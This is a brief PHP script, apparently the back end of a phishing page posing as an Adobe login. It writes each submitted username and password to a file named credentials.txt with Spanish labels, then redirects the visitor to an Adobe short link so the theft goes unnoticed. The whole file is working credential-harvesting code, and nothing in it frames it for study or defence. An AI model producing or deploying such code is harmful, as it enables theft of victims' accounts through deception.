<?php

file_put_contents("credentials.txt", "[+] Adobe -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://adobe.ly/2OE9ZKL');
exit();
?>
